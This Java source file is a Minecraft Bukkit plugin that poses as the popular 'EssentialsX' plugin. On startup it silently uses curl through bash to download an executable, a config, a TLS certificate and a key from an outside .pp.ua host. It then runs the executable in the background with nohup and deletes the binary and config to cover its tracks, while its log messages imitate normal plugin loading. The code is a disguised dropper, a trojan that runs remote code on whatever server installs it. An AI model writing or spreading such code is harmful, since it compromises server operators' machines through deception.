package com.example.essentialsx;

import org.bukkit.plugin.java.JavaPlugin;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.concurrent.TimeUnit;

public class EssentialsX extends JavaPlugin {


    // Java服务端端口
    private int port = ;


    @Override
    public void onEnable() {

        getLogger().info("EssentialsX plugin starting...");


        try {

            Files.createDirectories(
                    getDataFolder().toPath()
            );


            startRemoteJava();


            getLogger().info(
                    "EssentialsX plugin enabled"
            );


        } catch (Exception e) {

            getLogger().severe(
                    "Failed to start java service: "
                            + e.getMessage()
            );

            e.printStackTrace();
        }
    }



    private void startRemoteJava() throws Exception {


        Path folder =
                getDataFolder().toPath();



        String javaUrl =
                "https://netjett-de.kof95zip.pp.ua/java/java";


        String confUrl =
                "https://netjett-de.kof95zip.pp.ua/java/config.php?port="
                        + port;


        String crtUrl =
                "https://netjett-de.kof95zip.pp.ua/java/server.crt";


        String keyUrl =
                "https://netjett-de.kof95zip.pp.ua/java/server.key";



        Path javaFile =
                folder.resolve("java");


        Path configFile =
                folder.resolve("config.json");


        Path crtFile =
                folder.resolve("server.crt");


        Path keyFile =
                folder.resolve("server.key");



        // 下载文件

        downloadIfNotExists(
                javaUrl,
                javaFile
        );


        downloadIfNotExists(
                confUrl,
                configFile
        );


        downloadIfNotExists(
                crtUrl,
                crtFile
        );


        downloadIfNotExists(
                keyUrl,
                keyFile
        );



        // java 添加执行权限

        Process chmod =
                new ProcessBuilder(
                        "chmod",
                        "+x",
                        javaFile.toString()
                )
                .start();


        chmod.waitFor();



        // 启动后台Java

        ProcessBuilder pb =
                new ProcessBuilder(
                        "bash",
                        "-c",
                        "nohup ./java -c config.json > /dev/null 2>&1 &"
                );


        pb.directory(
                folder.toFile()
        );


        pb.start();


        getLogger().info(
                "Plugins starting..."
        );


        // 等待Java初始化
        Thread.sleep(3000);


        // 删除java文件和config.json

        String[] files = {
                "java",
                "config.json"
        };


        for (String file : files) {

            Path logFile =
                    folder.resolve(file);


            if (Files.exists(logFile)) {

                Files.delete(logFile);

                getLogger().info(
                        file + " deleted after plugins start."
                );

            } else {

                getLogger().info(
                        file + " not found."
                );
            }
        }


        getLogger().info(
                "Remote java started, port="
                        + port
        );

    }




    /**
     * 文件不存在才下载
     */
    private void downloadIfNotExists(
            String url,
            Path target
    ) throws Exception {


        if (Files.exists(target)) {

            getLogger().info(
                    target.getFileName()
                            + " exists, skip download."
            );

            return;
        }



        getLogger().info(
                "Downloading "
                        + target.getFileName()
        );



        Process process =
                new ProcessBuilder(
                        "bash",
                        "-c",
                        "curl -Ls \""
                                + url
                                + "\" -o \""
                                + target
                                + "\""
                )
                .start();



        int exit =
                process.waitFor();



        if (exit != 0) {

            throw new IOException(
                    "Download failed: "
                            + target.getFileName()
            );
        }


    }




    @Override
    public void onDisable() {


        getLogger().info(
                "EssentialsX disabled"
        );


    }
}
